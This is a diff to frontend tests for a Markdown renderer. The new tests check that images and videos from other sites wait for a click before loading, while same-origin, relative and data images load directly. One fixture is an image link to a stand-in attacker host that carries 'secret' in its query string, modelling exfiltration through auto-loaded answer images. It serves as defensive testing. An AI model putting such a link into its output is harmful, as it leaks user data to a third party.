@@ -250,7 +250,10 @@ test("an image or a link cannot carry a script", () => {
 
 test("images are loaded lazily and fit the column", () => {
   const { container } = render(
-    <Markdown text="![shot](https://raw.githubusercontent.com/x/y/main/a.png)" />,
+    <Markdown
+      text="![shot](https://raw.githubusercontent.com/x/y/main/a.png)"
+      remoteMedia="load"
+    />,
   );
   expect(container.querySelector("img")?.getAttribute("loading")).toBe("lazy");
   const css = stylesSource();
@@ -279,7 +282,10 @@ test("an @coddy: reference in an answer opens the documentation reader", () => {
 // binary carries none.
 test("a video file in an image slot plays in a video element", () => {
   const { container } = render(
-    <Markdown text="![Video: swarm.mp4](https://raw.githubusercontent.com/x/y/1.1.55/docs/assets/video/swarm.mp4)" />,
+    <Markdown
+      text="![Video: swarm.mp4](https://raw.githubusercontent.com/x/y/1.1.55/docs/assets/video/swarm.mp4)"
+      remoteMedia="load"
+    />,
   );
   const video = container.querySelector("video");
   expect(video?.getAttribute("src")).toBe(
@@ -362,4 +368,39 @@ test("a message ending in a list ends as one ending in a paragraph", () => {
   expect(css).toContain(
     ".md > :where(ul, ol):last-child, .md > :where(ul, ol):last-child > :where(li:last-child) { margin-bottom: 0; }",
   );
+});
+
+// An answer's picture from another site waits for a click: rendering it
+// would make the browser fetch the address, and whatever it carries, at once.
+test("a picture from another site waits for a click", () => {
+  const { container } = render(
+    <Markdown text="![diagram](https://attacker.example/x.png?d=secret)" />,
+  );
+  expect(container.querySelector("img")).toBeNull();
+  const gate = screen.getByTestId("md-remote-media");
+  expect(gate.textContent).toContain("diagram");
+  expect(gate.textContent).toContain("attacker.example");
+  fireEvent.click(gate);
+  expect(container.querySelector("img")?.getAttribute("src")).toBe(
+    "https://attacker.example/x.png?d=secret",
+  );
+});
+
+test("a video from another site waits for a click", () => {
+  const { container } = render(
+    <Markdown text="![clip](https://attacker.example/clip.mp4)" />,
+  );
+  expect(container.querySelector("video")).toBeNull();
+  expect(screen.getByTestId("md-remote-media").textContent).toContain("video");
+});
+
+test("a picture of this server, a relative one and a data picture load at once", () => {
+  const own = `${window.location.origin}/coddy/sessions/s/assets/a.png`;
+  const { container } = render(
+    <Markdown
+      text={`![own](${own}) ![rel](assets/b.png) ![data](data:image/png;base64,iVBORw0KGgo=)`}
+    />,
+  );
+  expect(screen.queryByTestId("md-remote-media")).toBeNull();
+  expect(container.querySelectorAll("img")).toHaveLength(3);
 });
